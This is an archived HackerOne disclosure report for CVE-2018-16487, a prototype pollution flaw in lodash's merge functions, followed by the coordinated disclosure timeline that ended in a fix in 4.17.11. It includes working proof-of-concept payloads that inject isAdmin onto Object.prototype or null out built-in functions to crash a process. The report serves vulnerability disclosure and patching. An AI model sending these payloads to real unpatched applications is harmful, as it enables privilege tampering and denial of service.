---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2018-10-30
submitted: 2018-07-12T08:28:18.713Z
bounty_usd: null
votes: 15
cve: "CVE-2018-16487"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "asgerf"
source: "https://hackerone.com/reports/380873"
title: "Prototype pollution attack (lodash / constructor.prototype)"
---
# Prototype pollution attack (lodash / constructor.prototype)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 15 | **Program:** Node.js third-party modules | **Disclosed:** 2018-10-30

- Report: [https://hackerone.com/reports/380873](https://hackerone.com/reports/380873)
- CWE: Uncontrolled Resource Consumption | CVE: CVE-2018-16487
- Submitted: 2018-07-12T08:28:18.713Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** lodash
**version:** 4.17.10
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

12M downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` and send it to `_.merge`.

```javascript
var _ = require('lodash');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
_.merge({}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Timeline

- **Report Filed**
- **2018-07-13** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **2018-07-13** @e_lexy: Hi @asgerf,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Report Triaged**
- **External User Joined**
- **2018-07-16** @jdalton: Thanks for the heads up. This is something I'll want to patch right up.
- **2018-08-06** @e_lexy: @jdalton any news on your side?
- **2018-08-29** @e_lexy: @jdalton Checking the GH repo I didn't see any commits in this direction. If you were able to mitigate the prototype pollution attack, could you update this issue please?
- **2018-08-30** @jdalton: Ah sorry, I missed the ping. I have not mitigated the issue yet.
- **2018-08-30** @e_lexy: @jdalton, this report is over 45 days old so we really should be disclosing. Seeing as lodash is so widely used, I would like to have a fix available before disclosure. Is it feasible to have a fix any time soon?
- **2018-08-30** @jdalton: Ah ok, understood. I'll patch it tonight, provide a link to verify the fix, and release tomorrow.
- **2018-08-31** @jdalton: Patched [here](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad).
jsbin [here](https://jsbin.com/rimuqaj/1/edit?js,console).
- **2018-08-31** @jdalton: Can you all verify the patch resolves the issue (a second set of folks poking at it would help).
- **2018-08-31** @asgerf: There are a few more variations; I realize I should have been more explicit in the original report.

Denial of service is still possible, for example by removing `Function.prototype.call`:
```javascript
var payload = {"toString": {"constructor": {"prototype": {"call": null}}}}
_.merge({}, payload);
console.log(function(){}.call(undefined)); // crash
```
Or removing `Object.getOwnPropertyNames`:
```javascript
var payload = {"constructor": {"getOwnPropertyNames": null}}
```
I believe Object, Array, Function, Number, String, and Boolean and their prototypes were all originally vulnerable, and the patch only protects Object.prototype.

One way to guard against this might be to replace a property entirely (rather than recursively extend it) if the destination object doesn't have that property as an own property. That would prevent traversing the built-in `constructor` property, but wouldn't prevent users from using the name `constructor` in other contexts. Or just copy what jquery or another library does to avoid re-inventing the wheel.
- **2018-08-31** @jdalton: Ah thanks. I think another patch actually fixed both. Will update the jsbin test case in a couple minutes with a new build (I'll post back with a new link)
- **2018-08-31** @jdalton: Ok try [this](https://jsbin.com/lewikas/1/edit?js,console)
- **2018-09-01** @asgerf: lgtm
- **2018-09-02** @jdalton: Ok great! Imma try to release this weekend.
- **Report Resolved**
- **Report Reopened**
- **Report Triaged**
- **2018-10-15** @jdalton: You can verify on 4.17.11.
- **2018-10-15** @e_lexy: @asgerf could you verify, please?
- **2018-10-15** @asgerf: Confirmed fix in 4.17.11
- **Report Resolved**
- **Agreed On Going Public**
- **2018-10-15** @jdalton: Thanks all for your patience and follow through. Please feel free to ping me for any other issues.
- **Manually Disclosed**
- **2018-12-10** @asgerf: @e_lexy Could I ask you request a CVE for this, assigned to the Semmle Security Research Team?
- **2019-01-03** @e_lexy: Hi @asgerf CVE requested and asked to assign to Semmle Security Research Team. Sorry for the late response
- **Report Severity Updated**
- **Bounty Awarded**
